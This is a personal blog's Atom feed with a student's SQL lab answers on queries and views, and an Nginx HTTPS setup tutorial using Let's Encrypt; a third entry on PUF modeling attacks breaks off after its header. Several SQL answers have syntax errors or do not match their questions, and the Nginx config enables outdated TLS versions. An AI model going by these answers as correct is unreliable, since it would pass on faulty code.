<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Abigale</title>
  
  <subtitle>The personal website of 张浩森 | 天行健，君子以自强不息 。地势坤，君子以厚德载物</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-04-29T02:57:12.955Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>zhs</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL练习2</title>
    <link href="http://yoursite.com/2018/04/29/SQL%E7%BB%83%E4%B9%A02/"/>
    <id>http://yoursite.com/2018/04/29/SQL练习2/</id>
    <published>2018-04-29T02:55:55.000Z</published>
    <updated>2018-04-29T02:57:12.955Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><p>​    掌握复杂查询的使用方法。</p><p>​    掌握视图的创建、视图的查询以及通过视图更新（插入、修改、删除）基本表中的数据。</p><h3 id="二、实验任务"><a href="#二、实验任务" class="headerlink" title="二、实验任务"></a>二、实验任务</h3><h5 id="综合查询："><a href="#综合查询：" class="headerlink" title="综合查询："></a>综合查询：</h5><p>1、求不选修C语言课程的学生学号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> S <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> SC <span class="keyword">where</span> sno = S.sno <span class="keyword">and</span> cno = (</span><br><span class="line"><span class="keyword">select</span> cno <span class="keyword">from</span> C <span class="keyword">where</span> cname = <span class="string">'C语言'</span>));</span><br></pre></td></tr></table></figure><p>2、查询平均成绩在60分以上的学生姓名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname <span class="keyword">from</span> S x <span class="keyword">where</span> <span class="number">60</span> &lt;= (</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">avg</span>(grade) <span class="keyword">from</span> SC y <span class="keyword">where</span> x.sno = y.sno);</span><br></pre></td></tr></table></figure><p>3、求这样的学生姓名：该学生选修了全部课程并且其中一门课在90分以上。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname <span class="keyword">from</span> S <span class="keyword">where</span> sno <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">count</span>(*) = (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> C) <span class="keyword">in</span>(</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">max</span>(grade) &gt; <span class="number">90</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sname <span class="keyword">from</span> S <span class="keyword">where</span> sno <span class="keyword">in</span>(</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> SC <span class="keyword">where</span> sno <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> S <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> C <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> SC <span class="keyword">where</span> sno = S.sno <span class="keyword">and</span> cno = C.cno))) <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">max</span>(grade) &gt; <span class="number">90</span>);</span><br></pre></td></tr></table></figure><p>4、查询选修课程数在两门以上的学生姓名。（用连接查询和嵌套查询两种方法实现）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#嵌套查询</span><br><span class="line"><span class="keyword">select</span> sname <span class="keyword">from</span> S <span class="keyword">where</span> sno <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">#连接查询</span><br><span class="line"><span class="keyword">select</span> S.sname <span class="keyword">from</span> S <span class="keyword">inner</span> <span class="keyword">join</span> SC <span class="keyword">on</span> S.sno = SC.sno <span class="keyword">group</span> <span class="keyword">by</span> sname <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt; <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>5、查询所有成绩都及格的学生人数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">distinct</span> sno) <span class="keyword">from</span> SC <span class="keyword">where</span> sno <span class="keyword">in</span>(</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">min</span>(grade) &gt;= <span class="number">60</span>);</span><br></pre></td></tr></table></figure><p>6、查询成绩及格的学生人次。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(sname) <span class="keyword">from</span> S <span class="keyword">where</span> sname <span class="keyword">in</span>(<span class="keyword">select</span> sname <span class="keyword">from</span> S x <span class="keyword">where</span> <span class="number">60</span> &lt;= (</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">avg</span>(grade) <span class="keyword">from</span> SC y <span class="keyword">where</span> x.sno = y.sno));</span><br></pre></td></tr></table></figure><p>7、查询所有学生都没有选修的课程名称。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> cname <span class="keyword">from</span> C <span class="keyword">where</span> cno <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> cno <span class="keyword">from</span> SC);</span><br></pre></td></tr></table></figure><p>8、查询每个学生的平均成绩，并按平均成绩的降序排序。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname, <span class="keyword">avg</span>(grade) <span class="keyword">from</span> S,SC <span class="keyword">where</span> S.sno = SC.sno <span class="keyword">group</span> <span class="keyword">by</span> SC.sno <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">avg</span>(grade) <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>9、查询每个同学的最高分，要求显示学号、姓名和分数等信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> S.sno, sname, <span class="keyword">max</span>(grade) <span class="keyword">from</span> SC,S <span class="keyword">where</span> S.sno = SC.sno <span class="keyword">group</span> <span class="keyword">by</span> SC.sno;</span><br></pre></td></tr></table></figure><p>10、查询选修同一门课程的学生学号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> sno <span class="keyword">from</span> SC,C <span class="keyword">where</span> SC.cno = C.cno;</span><br></pre></td></tr></table></figure><p>11、查询不及格学生的学号、课程名、开课学期的信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SC.sno, C.cname, SC.term <span class="keyword">from</span> SC,C <span class="keyword">where</span> SC.cno = C.cno <span class="keyword">and</span> sno <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">avg</span>(grade) &lt; <span class="number">60</span>);</span><br></pre></td></tr></table></figure><p>12、按学号分组汇总总分高于100的学生记录，并按总分的降序排列。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> S.* <span class="keyword">from</span> S,SC <span class="keyword">where</span> S.sno = SC.sno <span class="keyword">group</span> <span class="keyword">by</span> SC.sno <span class="keyword">having</span> <span class="keyword">sum</span>(grade) &gt; <span class="number">100</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">sum</span>(grade) <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>13、求恰好有两门课程不及格的学生信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> S <span class="keyword">where</span> sno <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> sc <span class="keyword">where</span> grade &lt; <span class="number">60</span> <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">count</span>(cno)=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>14、查询每门课程的最高分的学生记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> S.*, SC.cno <span class="keyword">from</span> S,SC,C <span class="keyword">where</span> S.sno = SC.sno <span class="keyword">and</span> SC.cno = C.cno <span class="keyword">and</span> grade <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">max</span>(grade) <span class="keyword">from</span> SC <span class="keyword">where</span> SC.cno = C.cno);</span><br></pre></td></tr></table></figure><p>15、查询每个学生的最低分的课程记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> C.*, SC.sno <span class="keyword">from</span> S,SC,C <span class="keyword">where</span> S.sno = SC.sno <span class="keyword">and</span> SC.cno = C.cno <span class="keyword">and</span> grade <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(grade) <span class="keyword">from</span> SC <span class="keyword">where</span> SC.sno = S.sno);</span><br></pre></td></tr></table></figure><p><strong>视图管理：</strong></p><p>1、为学生表创建一个视图V_XSQK，以显示学生的基本信息，如学号、姓名、性别和出生年月。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> V_XSQK <span class="keyword">as</span> <span class="keyword">select</span> sno,sname,ssex,sbirth <span class="keyword">from</span> S;</span><br></pre></td></tr></table></figure><p>2、创建视图V_SC，要求显示学生的姓名、选修的课程名和成绩。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> V_SC <span class="keyword">as</span> <span class="keyword">select</span> S.sname,C.cname,SC.grade <span class="keyword">from</span> S,C,SC <span class="keyword">where</span> S.sno=SC.sno <span class="keyword">and</span> C.cno=SC.cno;</span><br></pre></td></tr></table></figure><p>3、创建视图V_ST，显示在1981-1-1以后出生的学生信息，包括学号，姓名，性别和出生年月。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> V_ST <span class="keyword">as</span> <span class="keyword">select</span> sno,sname,ssex,sbirth <span class="keyword">from</span> S <span class="keyword">where</span> sbirth&gt;<span class="string">'1981-1-1'</span>;</span><br></pre></td></tr></table></figure><p>4、创建视图v_HG，显示成绩合格的学生信息，包括姓名、课程名和成绩。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> v_HG <span class="keyword">as</span> <span class="keyword">select</span> S.sname,C.cname,SC.grade <span class="keyword">from</span> S,C,SC, <span class="keyword">where</span> S.sno=SC.sno <span class="keyword">and</span> C.cno=SC.cno <span class="keyword">and</span> SC.grade&gt;=<span class="number">60</span>;</span><br></pre></td></tr></table></figure><p>5、创建分组视图V_GP，要求查询每个学生的平均成绩，包括姓名，平均成绩。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> v_GP <span class="keyword">as</span> <span class="keyword">select</span> S.sname, <span class="keyword">avg</span>(grade) <span class="keyword">from</span> S,SC <span class="keyword">where</span> S.sno = SC.sno <span class="keyword">group</span> <span class="keyword">by</span> SC.sno;</span><br></pre></td></tr></table></figure><p>6、向视图V_XSQK中插入一条记录：‘2020206’，‘李红’，‘1983-12-3’。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> V_XSQK <span class="keyword">values</span> (<span class="string">'2020206'</span>,<span class="string">'李红'</span>,<span class="string">'女'</span>,<span class="string">'1983-12-3'</span>);</span><br></pre></td></tr></table></figure><p>7、修改视图V_XSQK，将李红同学是出生年月改为1982-12-3。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> V_XSQK <span class="keyword">set</span> sbirth=<span class="string">'1982-12-3'</span> <span class="keyword">where</span> sno=<span class="string">'2020206'</span>;</span><br></pre></td></tr></table></figure><p>8、删除视图V_XSQK中李红同学的信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> V_XSQK <span class="keyword">where</span> sno=<span class="string">'2020206'</span>;</span><br></pre></td></tr></table></figure><p>9、删除视图V_XSQK。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> v_XSQK;</span><br></pre></td></tr></table></figure><p>10、创建视图V_PJ，查询平均成绩在60分以上的学生信息，包括姓名和平均成绩。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> <span class="keyword">replace</span> <span class="keyword">view</span> V_PJ <span class="keyword">as</span> <span class="keyword">select</span> S.sname, <span class="keyword">avg</span>(grade) <span class="keyword">from</span> S,SC <span class="keyword">where</span> S.sno = SC.sno <span class="keyword">group</span> <span class="keyword">by</span> SC.sno <span class="keyword">having</span> <span class="keyword">avg</span>(grade) &gt; <span class="number">60</span>;</span><br></pre></td></tr></table></figure><p>注意：用到的表结构及信息如下：</p><p>S：学生基本信息表；C：课程基本信息表；SC：学生选课信息表。</p><p>各表的结构以及数据如下所示：  </p><p>表2.1 学生基本信息表(表名：S)</p><table><thead><tr><th>sno</th><th>sname</th><th>ssex</th><th>sbirth</th><th>Sdept</th></tr></thead><tbody><tr><td>95001</td><td>李勇</td><td>男</td><td>1986/1/1</td><td>CS</td></tr><tr><td>95002</td><td>刘晨</td><td>女</td><td>1985/2/1</td><td>IS</td></tr><tr><td>95003</td><td>王敏</td><td>女</td><td>1886/10/4</td><td>MA</td></tr><tr><td>95004</td><td>张立</td><td>男</td><td>1985/6/8</td><td>IS</td></tr></tbody></table><p>表2.2 课程基本信息表(表名：C)</p><table><thead><tr><th>cno</th><th>cname</th><th>cpno</th><th>Ccredit</th></tr></thead><tbody><tr><td>1</td><td>数据库</td><td>2</td><td>4</td></tr><tr><td>2</td><td>数学</td><td></td><td>3</td></tr><tr><td>3</td><td>信息系统</td><td>1</td><td>4</td></tr><tr><td>4</td><td>操作系统</td><td>5</td><td>3</td></tr><tr><td>5</td><td>数据结构</td><td>6</td><td>3</td></tr><tr><td>6</td><td>C语言</td><td></td><td>2</td></tr></tbody></table><p>表2.3 学生选课信息表(表名：SC)</p><table><thead><tr><th>sno</th><th>cno</th><th>grade</th><th>term</th></tr></thead><tbody><tr><td>95001</td><td>1</td><td>92</td><td>1</td></tr><tr><td>95001</td><td>2</td><td>85</td><td>2</td></tr><tr><td>95001</td><td>3</td><td>87</td><td>3</td></tr><tr><td>95002</td><td>2</td><td>78</td><td>2</td></tr><tr><td>95002</td><td>3</td><td>84</td><td>3</td></tr><tr><td>95003</td><td>1</td><td>30</td><td>1</td></tr><tr><td>95004</td><td>2</td><td>58</td><td>2</td></tr><tr><td>95004</td><td>4</td><td>70</td><td>3</td></tr><tr><td>95002</td><td>5</td><td>60</td><td>4</td></tr><tr><td>95003</td><td>4</td><td>70</td><td>3</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、实验目的&quot;&gt;&lt;a href=&quot;#一、实验目的&quot; class=&quot;headerlink&quot; title=&quot;一、实验目的&quot;&gt;&lt;/a&gt;一、实验目的&lt;/h3&gt;&lt;p&gt;​    掌握复杂查询的使用方法。&lt;/p&gt;
&lt;p&gt;​    掌握视图的创建、视图的查询以及通过视图更新（插入
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网站配置HTTPS加密传输协议</title>
    <link href="http://yoursite.com/2018/04/29/HTTPS%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2018/04/29/HTTPS配置/</id>
    <published>2018-04-29T00:57:03.000Z</published>
    <updated>2018-04-29T00:59:46.414Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>​    当今时代对上网的安全性要求比以前更高，chrome和firefox也都大力支持网站使用HTTPS，苹果也从2017年开始在iOS 10系统中强制app使用HTTPS来传输数据，微信小程序也是要求必须使用HTTPS请求，由此可见HTTPS势在必行。Google浏览器也把所有没有用https协议的网站判断为危险网站。</p><h2 id="二、HTTPS"><a href="#二、HTTPS" class="headerlink" title="二、HTTPS"></a>二、HTTPS</h2><p>​    超文本传输安全协议（英语：Hypertext Transfer Protocol Secure，缩写：HTTPS，常称为HTTP over TLS，HTTP over SSL或HTTP Secure）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。这个协议由网景公司（Netscape）在1994年首次提出，随后扩展到互联网上。</p><p>​    与HTTP的URL由“<a href="http://”起始且默认使用端口80不同，HTTPS的URL由“https://”起始且默认使用端口443。HTTP是不安全的，且攻击者通过监听和中间人攻击等手段，可以获取网站帐户和敏感信息等。HTTPS被设计为可防止前述攻击，并在正确配置时被认为是安全的。" target="_blank" rel="noopener">http://”起始且默认使用端口80不同，HTTPS的URL由“https://”起始且默认使用端口443。HTTP是不安全的，且攻击者通过监听和中间人攻击等手段，可以获取网站帐户和敏感信息等。HTTPS被设计为可防止前述攻击，并在正确配置时被认为是安全的。</a></p><p>​    这学期上了计算机网络，目前正在学习传输层的相关知识，在TCP的rdt中翻来覆去的折腾。因为学习应用层的时候学习了HTTP协议，就准备给自己的网站配置一下HTTPS。</p><p>​    http与https的几点区别：<br>1、https协议需要到CA申请证书，一般是收费的。<br>2、http协议运行在TCP之上，所有传输的内容都是明文，https运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。<br>3、http与https是两种不同的链接方式，端口也不一样，http使用80端口，https使用443端口。<br>4、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</p><h2 id="三、HTTPS-SSL证书"><a href="#三、HTTPS-SSL证书" class="headerlink" title="三、HTTPS SSL证书"></a>三、HTTPS SSL证书</h2><p>​    SSL证书，用于加密HTTP协议，也就是HTTPS。淘宝、百度等网站纷纷实现全站Https加密访问，搜索引擎对于HTTPS更加友好，加上互联网上越来越多的人重视隐私安全，站长们给网站添加SSL证书似乎成为了一种趋势。</p><p>​    如果是首次考虑为网站部署HTTPS，估计在选择证书上会有些头疼，查阅一些资料后发现这里要考虑的因素确实有很多，比如是否支持多域名、泛域名、保额、证书的价格还有浏览器上的小图标样式区别等等。目前主流的SSL证书主要分为DV SSL、OV SSL、EV SSL、还有自签名证书。</p><p>​    这里要注意，自签名证书是被浏览器视作不安全的。因此不能利用软件生成自签名证书来加密HTTP。</p><h2 id="四、Let’s-Encrypt-SSL证书"><a href="#四、Let’s-Encrypt-SSL证书" class="headerlink" title="四、Let’s Encrypt SSL证书"></a>四、Let’s Encrypt SSL证书</h2><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqt85v8xxxj309f0290sn.jpg" alt=""></p><p>​    Let’s Encrypt是国外一个公共的免费SSL项目，由 Linux 基金会托管，它的来头不小，由Mozilla、思科、Akamai、IdenTrust和EFF等组织发起，目的就是向网站自动签发和管理免费证书，以便加速互联网由HTTP过渡到HTTPS。<br>    Let’s Encrypt安装部署简单、方便，目前也已经有现成的安装脚本，可以很快的完成证书的申请及发放。<br>    目前Let’s Encrypt免费证书的有效期只有90天，由于Let’s Encrypt的证书属于自动签发的，所以我们也可以自己写脚本来实现定期自动更新Let’s Encrypt证书，达到一劳永逸的效果。</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqt87vo56aj30hk066mxn.jpg" alt=""></p><h2 id="五、利用Let’s-Encrypt-SSL实现网站HTTPS"><a href="#五、利用Let’s-Encrypt-SSL实现网站HTTPS" class="headerlink" title="五、利用Let’s Encrypt SSL实现网站HTTPS"></a>五、利用Let’s Encrypt SSL实现网站HTTPS</h2><p>​    利用脚本快速获取Let’s Encrypt SSL证书，官方推荐的自动化证书颁发和安装脚本是Certbot，所以这里也是采用这个脚本进行安装（执行脚本需要root权限 ）。</p><p>获取脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.eff.org/certbot-auto</span><br><span class="line">chmod a+x certbot-auto</span><br><span class="line">mv certbot-auto /usr/local/sbin/</span><br></pre></td></tr></table></figure><p>获取证书:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/sbin</span><br><span class="line">./certbot-auto certonly</span><br></pre></td></tr></table></figure><p>后面的获取取证书过程中Let’s encrypt需要验证用户对域名的所有权，根据提示操作即可。</p><p>第一步选择nginx插件，后面的按照提示走就可以了。</p><p>可以进入/etc/letsencrypt/live/www.abigale.xin路径下查看生成的证书。</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqt8k3dk3fj30fu05mdgs.jpg" alt=""></p><p>配置网站使用HTTPS访问，在Nginx中需要同时绑定两个Server分别监听80（HTTP）及443（HTTPS）端口。</p><p>Nginx关键配置清单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen  80;</span><br><span class="line">    server_name  yourdomain.com www.yourdomain.com;</span><br><span class="line">    ##80端口接收的请求直接重定向到HTTPS端口</span><br><span class="line">    return 301 https://www.yourdomain.com$request_uri;</span><br><span class="line">    ##....</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 443 default ssl;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    server_name  yourdomain.com www.yourdomain.com;</span><br><span class="line">    ##...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置完成后重载入Nginx配置即可生效，再次通过浏览器访问你的网站就可以看到绿色小锁头的图标了。</p><p>Let’s Encrypt 证书的有效期为90天，建议是每60天更新证书，以免有误差影响正常服务，证书自动更新可以通过运行certbot-auto来进行。<br>为所有已安装证书的域名更新，运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto renew</span><br></pre></td></tr></table></figure><p>命令执行过程会检查证书的到期日期，如果证书还未到期会提示你的证书尚未到期，输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Processing /etc/letsencrypt/renewal/yourdomain.com.conf</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Cert not yet due for renewal</span><br><span class="line">The following certs are not due for renewal yet:</span><br><span class="line">  /etc/letsencrypt/live/yourdomain.com/fullchain.pem (skipped)</span><br><span class="line">No renewals were attempted.</span><br></pre></td></tr></table></figure><p>为确保证书永不过期，需要增加一个cron的定期执行任务，由于更新证书脚本首先会检查证书的到期日期，并且仅当证书距离少于30天时才会执行更新，因此可以安全的创建每周甚至每天运行的cron任务。<br>编辑crontab来创建一个定时调度任务（需要root权限），运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crontab -e</span><br></pre></td></tr></table></figure><p>添下以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">30 3 * * 1 /usr/local/sbin/certbot-auto renew &gt;&gt; /var/log/letsencrypt-renew.log</span><br><span class="line">40 3 * * 1 /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><p>以上代码为创建两个定时调度任务，先是在每周一的上午3:30执行<code>certbot-auto renew</code>命令来更新证书，然后是在每周一上午3:40时重新加载Nginx，以使用更新的证书，命令生成的log将通过管道输出到/var/log/letsencrypt-renew.log日志文件。<br>至此，网站就已经开使用免费的Let’s Encrypt TLS/SSL证书来安全地提供HTTPS内容。</p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​    一个好的第三方证书颁发机构还是很重要的。配置HTTPS也是运维必备的技能。还有很多证书颁发机构，以后如果做运维了再去深入研究。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;​    当今时代对上网的安全性要求比以前更高，chrome和firefox也都大力支持网站使用HTTPS，苹果也从2017
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于机器学习的物理不可克隆函数(PUF)建模攻击</title>
    <link href="http://yoursite.com/2018/04/26/puf-attack/"/>
    <id>http://yoursite.com/2018/04/26/puf-attack/</id>
    <published>2018-04-26T04:42:38.000Z</published>
    <updated>2018-04-26T04:46:22.934Z</updated>
    
